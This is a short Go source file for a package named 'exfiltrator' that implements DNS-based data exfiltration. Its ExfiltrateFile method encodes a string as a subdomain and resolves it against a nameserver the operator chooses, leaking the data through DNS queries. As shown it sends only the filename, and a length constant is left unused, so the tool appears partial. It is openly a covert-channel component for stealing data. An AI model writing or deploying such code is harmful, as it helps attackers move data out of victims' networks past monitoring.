package exfiltrator

import (
	"context"
	"log"
	"net"
)

const (
	// To simplify implementations, the total length of a domain name (i.e.,
	// label octets and label length octets) is restricted to 255 octets or
	// less.
	// - https://www.rfc-editor.org/rfc/rfc1035#section-3.1
	MAX_DOMAIN_NAME_LENGTH = 255
)

type dnsExfiltrator struct {
	NameServer string
}

func NewDnsExfiltrator(nameServer string) *dnsExfiltrator {
	return &dnsExfiltrator{
		NameServer: nameServer,
	}
}

func (ex *dnsExfiltrator) ExfiltrateFile(filename string) {
	_, err := net.DefaultResolver.LookupIP(context.Background(), "ip4", filename+"."+ex.NameServer)
	if err != nil {
		log.Fatalln(err)
	}
}
